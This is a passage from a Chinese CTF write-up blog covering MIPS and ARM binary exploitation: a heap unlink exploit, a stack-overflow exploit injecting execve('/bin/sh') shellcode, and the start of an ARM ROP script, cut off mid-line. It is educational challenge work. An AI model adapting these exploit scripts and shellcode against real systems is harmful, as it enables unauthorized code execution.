punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user you want show: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token punctuation">)</span>note_list <span class="token operator">=</span> <span class="token number">0x411830</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>note_list<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>note_list<span class="token number">-0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x411830</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"info: "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x411830</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-UCTF-2016-ADD"><a href="#0x03-UCTF-2016-ADD" class="headerlink" title="0x03 UCTF 2016 ADD"></a>0x03 UCTF 2016 ADD</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/7.png"></div>32位mips<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>这里也不能叫IDA了，使用叫Ghidra的软件，据说是美国郭建安全局开发的逆向软件。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> random_number<span class="token punctuation">;</span>  <span class="token keyword">long</span> lVar1<span class="token punctuation">;</span>  <span class="token keyword">long</span> lVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>__s<span class="token punctuation">;</span>  uint number3_0x80<span class="token punctuation">;</span>  <span class="token keyword">char</span> challenge <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> buf <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[calc]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Type \'help\' for  help."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* 随机数 */</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x123456</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  random_number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>challenge<span class="token punctuation">,</span><span class="token string">"%d"</span><span class="token punctuation">,</span>random_number<span class="token punctuation">)</span><span class="token punctuation">;</span>  number3_0x80 <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>  __s <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token keyword">do</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>number3_0x80 <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>LAB_00400984<span class="token punctuation">:</span>    random_number <span class="token operator">=</span> <span class="token function">_IO_getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 栈溢出</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>random_number <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00400ad4<span class="token punctuation">;</span>LAB_004009a4<span class="token punctuation">:</span>    <span class="token operator">*</span>__s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>random_number<span class="token punctuation">;</span>    number3_0x80 <span class="token operator">=</span> number3_0x80 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    __s <span class="token operator">=</span> __s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>random_number <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>number3_0x80 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004009c0<span class="token punctuation">;</span>  <span class="token keyword">do</span> <span class="token punctuation">{</span>    <span class="token operator">*</span>__s <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>LAB_004009c0<span class="token punctuation">:</span>    __s <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__s <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token operator">*</span>__s <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    random_number <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"help"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>random_number <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      __s <span class="token operator">=</span> <span class="token string">"Type \'exit\' to exit."</span><span class="token punctuation">;</span>LAB_00400b18<span class="token punctuation">:</span>      <span class="token function">puts</span><span class="token punctuation">(</span>__s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input 2 numbers just like:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>      random_number <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>random_number <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Exiting..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      random_number <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>challenge<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输入等于随机数，打印出栈地址，实际上随机数可预测。</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>random_number <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input was %p\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        number3_0x80 <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>        __s <span class="token operator">=</span> buf<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LAB_00400984<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      __s <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>__s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        __s <span class="token operator">=</span> <span class="token string">"Error!"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LAB_00400b18<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      lVar1 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      lVar2 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>__s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d + %d = %d\n"</span><span class="token punctuation">,</span>lVar1<span class="token punctuation">,</span>lVar2<span class="token punctuation">,</span>lVar2 <span class="token operator">+</span> lVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>lVar2 <span class="token operator">+</span> lVar1 <span class="token operator">==</span> <span class="token number">0x133a05e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thanks,Bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    number3_0x80 <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>    random_number <span class="token operator">=</span> <span class="token function">_IO_getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    __s <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> random_number<span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004009a4<span class="token punctuation">;</span>LAB_00400ad4<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>__s <span class="token operator">==</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span> true <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>很清晰的感觉mips指令比arm的麻烦很多，不好看Orz…..</p><p>根据上面的反汇编代码，我们思路如下：根据随机数预测来打印出栈地址，写入shellcode到栈中，ROP劫持pc寄存器返回栈地址执行shellcode。</p><p>shellcode的生成就用msf，有个坑就是msf这里把mipsel叫mipsle</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>remote_gdb<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/mipsel-linux-gnu/"</span><span class="token punctuation">,</span> <span class="token string">"./add"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/mipsel-linux-gnu/"</span><span class="token punctuation">,</span> <span class="token string">"./baby_heap"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span>  <span class="token string">""</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Type 'help' for  help.\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2057561479</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your input was "</span><span class="token punctuation">)</span>    leak <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"input addr = "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>    offset <span class="token operator">=</span> <span class="token number">8</span>    payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset <span class="token operator">+</span> shellcode    payload <span class="token operator">+=</span> <span class="token string">"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">112</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leak <span class="token operator">+</span> offset<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">" 1"</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"1 2\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exit"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exiting..."</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> MIPS-Pwn入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mips-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM-PWN解题汇总（一）</title>
      <link href="/2020/10/21/arm-jie-ti-hui-zong-yi/"/>
      <url>/2020/10/21/arm-jie-ti-hui-zong-yi/</url>
      
        <content type="html"><![CDATA[<p>总结一下做的ARM题</p><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p><strong>HelloArm</strong>：64位栈溢出CSU读flag<br><strong>HelloArmShell</strong>：64位栈溢出CSU leak libc地址，读入system函数地址和/bin/sh，执行system(“/bin/sh”)<br><strong>2018上海市大学生信安竞赛</strong>：64栈溢出，执行mprotect，写shellcode<br><strong>jarvisoj_typo</strong>：32位栈溢出，简单的rop<br><strong>xman入营题babyheap</strong>：32位UAF leak libc地址，再UAF劫持bss段数据，写heap list劫持free函数，执行system(“/bin/sh”)<br><strong>第五空间安全大赛pwnme</strong>：32位unlink</p><h1 id="0x01-TSCTF-2020-HelloArm"><a href="#0x01-TSCTF-2020-HelloArm" class="headerlink" title="0x01 TSCTF-2020 HelloArm"></a>0x01 TSCTF-2020 HelloArm</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛结束了来调一下这个题</p><h2 id="查看文件-amp-IDA分析"><a href="#查看文件-amp-IDA分析" class="headerlink" title="查看文件&amp;IDA分析"></a>查看文件&amp;IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/0.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/1.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/2.png"></div><p>可以看到很明显的栈溢出</p><h2 id="思路-amp-exp"><a href="#思路-amp-exp" class="headerlink" title="思路&amp;exp"></a>思路&amp;exp</h2><p>题目一开始就将flag打开了，那么我们需要做的事情就是利用已有的read和write函数来打印出flag了</p><p>题目中有类似csu的gadget，拿过来慢慢调就行了</p><p>坑点是：arm打开文件句柄不是逐个增加的，flag句柄为5，调试比较麻烦，搞了半天。。。。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./HelloARM"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">global</span> premote_gdb<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token 